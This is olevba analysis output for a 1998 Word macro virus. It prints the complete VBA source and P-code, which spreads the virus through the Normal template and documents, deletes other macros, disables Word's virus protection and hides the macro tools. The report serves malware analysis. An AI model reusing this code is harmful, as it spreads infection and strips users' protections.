olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CyberHack.ag
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CyberHack.ag - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AsepMacro.bas 
in file: ./Virus.MSWord.CyberHack.ag - OLE stream: 'Macros/VBA/AsepMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'--------------------------------------------------
' Maaf saya mengganggu dokumen anda
' Macro ini tidak berbahaya
' Cuma Numpang Nampang aja loch....
' By   : Asep Kurniadi (STMIK MUHAMMADIYAH JAKARTA)
' Date : 13 November 1998 (Semanggi Berdarah)
'--------------------------------------------------
Sub CekMacroNT()
    On Error GoTo NTErr1
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    CekNT = False
    On Error GoTo NTErr2
    For i = 1 To NT.VBProject.VBComponents.Count
        nMacr = NT.VBProject.VBComponents(i).Name
        If nMacr = "AsepMacro" Then CekNT = True
        If (nMacr <> "ISave") And (nMacr <> "AsepMacro") And (nMacr <> "ThisDocument") Then
           Application.OrganizerDelete Source:=NT.FullName, _
           Name:=nMacr, Object:=wdOrganizerObjectProjectItems
        End If
    Next i
NTErr2:
    If CekNT = False Then
       On Error GoTo NTErr3
       Application.OrganizerCopy Source:=AD.FullName, _
               Destination:=NT.FullName, Name:="AsepMacro", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=AD.FullName, _
               Destination:=NT.FullName, Name:="ISave", Object:=wdOrganizerObjectProjectItems
       Templates(NT.Fulname).Save
NTErr3:
    End If
NTErr1:
End Sub
Sub CekMacroAD()
    On Error GoTo ADErr1
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    CekAD = False
    On Error GoTo ADErr2
    For i = 1 To AD.VBProject.VBComponents.Count
        nMacr = AD.VBProject.VBComponents(i).Name
        If nMacr = "AsepMacro" Then CekAD = True
        If (nMacr <> "AsepMacro") And (nMacr <> "ISave") And _
           (nMacr <> "ThisDocument") And (nMacr <> "Reference to Normal") Then
           Application.OrganizerDelete Source:=AD.FullName, _
           Name:=nMacr, Object:=wdOrganizerObjectProjectItems
        End If
    Next i
ADErr2:
    If CekAD = False Then
       Application.OrganizerCopy Source:=NT.FullName, _
               Destination:=AD.FullName, Name:="AsepMacro", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=NT.FullName, _
               Destination:=AD.FullName, Name:="ISave", Object:=wdOrganizerObjectProjectItems
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
ADErr1:
End Sub


Sub CekMacro()
    WordBasic.DisableAutoMacros 0
    With CommandBars("Visual Basic")
         .Visible = False
         .Enabled = False
         .Protection = msoBarNoChangeVisible
         .Protection = msoBarNoCustomize
    End With
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    With Options
         .VirusProtection = False
         .SaveNormalPrompt = False
    End With
    On Error GoTo 0
    Call CekMacroNT
    Call CekMacroAD
End Sub

Sub FileNew()
 On Error Resume Next
 Call CekMacro
 Dialogs(wdDialogFileNew).Show
 Call CekMacro
 ISave.Show
End Sub

Sub AutoOpen()
    Call CekMacro
End Sub
Sub FileOpen()
    On Error Resume Next
    Call CekMacro
    Dialogs(wdDialogFileOpen).Show
    Call CekMacro
    ISave.Show
End Sub
Sub FileExit()
    Call CekMacro
    ISave.Show
    WordBasic.FileExit
End Sub

Sub FileClose()
    On Error Resume Next
    Call CekMacro
    ISave.Show
    WordBasic.FileClose
    'Documents.Add
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Call CekMacro
    Dialogs(wdDialogFileSaveAs).Show
    ISave.Show
End Sub
Sub ToolsOptions()
    Call CekMacro
    ISave.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO ISave.frm 
in file: ./Virus.MSWord.CyberHack.ag - OLE stream: 'Macros/VBA/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 














Private Sub CmdClose_Click()
    Unload Me
End Sub

Private Sub ImgSTMIK_Click()
    MsgBox "Virus ini tidak berbahaya" _
        & Chr(13) & "hanya sekedar promosi"
End Sub

Private Sub LblISave_Click()
    MsgBox "By    : Asep Kurniadi" & Chr(13) & _
           "Date : 13 November 1998" & Chr(13) & _
           "       (Semanggi berdarah)"
End Sub

Private Sub UserForm_Activate()
    If Day(Date) = 22 And Month(Date) = 8 Then
       MsgBox "Ini hari Ulang Tahun ISAVE"
    End If
    tahun = Year(Date) - 1998
    If (Day(Date) = 13 Or Day(Date) = 14) And Month(Date) = 11 Then
       MsgBox "Mengenang " & Format$(tahun) & " Peristiwa Semanggi"
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.CyberHack.ag
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/AsepMacro - 6117 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x0022 " Maaf saya mengganggu dokumen anda"
' Line #2:
' 	QuoteRem 0x0000 0x001A " Macro ini tidak berbahaya"
' Line #3:
' 	QuoteRem 0x0000 0x0022 " Cuma Numpang Nampang aja loch...."
' Line #4:
' 	QuoteRem 0x0000 0x0032 " By   : Asep Kurniadi (STMIK MUHAMMADIYAH JAKARTA)"
' Line #5:
' 	QuoteRem 0x0000 0x002C " Date : 13 November 1998 (Semanggi Berdarah)"
' Line #6:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #7:
' 	FuncDefn (Sub CekMacroNT())
' Line #8:
' 	OnError NTErr1 
' Line #9:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #11:
' 	LitVarSpecial (False)
' 	St CekNT 
' Line #12:
' 	OnError NTErr2 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nMacr 
' Line #15:
' 	Ld nMacr 
' 	LitStr 0x0009 "AsepMacro"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CekNT 
' 	EndIf 
' Line #16:
' 	Ld nMacr 
' 	LitStr 0x0005 "ISave"
' 	Ne 
' 	Paren 
' 	Ld nMacr 
' 	LitStr 0x0009 "AsepMacro"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #17:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Label NTErr2 
' Line #21:
' 	Ld CekNT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #22:
' 	OnError NTErr3 
' Line #23:
' 	LineCont 0x0004 09 00 0F 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AsepMacro"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	LineCont 0x0004 09 00 0F 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ISave"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #25:
' 	Ld NT 
' 	MemLd Fulname 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #26:
' 	Label NTErr3 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Label NTErr1 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub CekMacroAD())
' Line #31:
' 	OnError ADErr1 
' Line #32:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #33:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #34:
' 	LitVarSpecial (False)
' 	St CekAD 
' Line #35:
' 	OnError ADErr2 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nMacr 
' Line #38:
' 	Ld nMacr 
' 	LitStr 0x0009 "AsepMacro"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CekAD 
' 	EndIf 
' Line #39:
' 	LineCont 0x0004 0D 00 0B 00
' 	Ld nMacr 
' 	LitStr 0x0009 "AsepMacro"
' 	Ne 
' 	Paren 
' 	Ld nMacr 
' 	LitStr 0x0005 "ISave"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #40:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Label ADErr2 
' Line #44:
' 	Ld CekAD 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LineCont 0x0004 09 00 0F 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AsepMacro"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	LineCont 0x0004 09 00 0F 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ISave"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Label ADErr1 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' Line #53:
' 	FuncDefn (Sub CekMacro())
' Line #54:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #55:
' 	StartWithExpr 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #56:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' Line #58:
' 	Ld msoBarNoChangeVisible 
' 	MemStWith Protection 
' Line #59:
' 	Ld msoBarNoCustomize 
' 	MemStWith Protection 
' Line #60:
' 	EndWith 
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #63:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #64:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #66:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #67:
' 	EndWith 
' Line #68:
' 	OnError (GoTo 0) 
' Line #69:
' 	ArgsCall (Call) CekMacroNT 0x0000 
' Line #70:
' 	ArgsCall (Call) CekMacroAD 0x0000 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub FileNew())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #76:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #77:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #78:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' Line #81:
' 	FuncDefn (Sub AutoOpen())
' Line #82:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub FileOpen())
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #87:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #88:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #89:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub FileExit())
' Line #92:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #93:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Sub FileClose())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #100:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #101:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #102:
' 	QuoteRem 0x0004 0x000D "Documents.Add"
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Sub FileSaveAs())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #108:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #109:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub ToolsOptions())
' Line #112:
' 	ArgsCall (Call) CekMacro 0x0000 
' Line #113:
' 	Ld ISave 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	EndSub 
' Macros/VBA/ISave - 2740 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CmdClose_Click())
' Line #15:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub ImgSTMIK_Click())
' Line #19:
' 	LineCont 0x0004 02 00 08 00
' 	LitStr 0x0019 "Virus ini tidak berbahaya"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0015 "hanya sekedar promosi"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub LblISave_Click())
' Line #23:
' 	LineCont 0x0008 08 00 0B 00 0F 00 0B 00
' 	LitStr 0x0015 "By    : Asep Kurniadi"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0017 "Date : 13 November 1998"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "       (Semanggi berdarah)"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #27:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	LitStr 0x001A "Ini hari Ulang Tahun ISAVE"
' 	ArgsCall MsgBox 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CE 
' 	Sub 
' 	St tahun 
' Line #31:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitStr 0x000A "Mengenang "
' 	Ld tahun 
' 	ArgsLd Format$$ 0x0001 
' 	Concat 
' 	LitStr 0x0013 " Peristiwa Semanggi"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sekolah Tinggi
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Manajemen Informatika dan KomputerB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Muhammadiyah Jakartaf
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(c) ISave 1998a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Calisto MT
-------------------------------------------------------------------------------
VBA FORM Variable "b'ImgSTMIK'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdClose'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK1'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK2'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK3'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblISave'" IN './Virus.MSWord.CyberHack.ag' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CmdClose_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

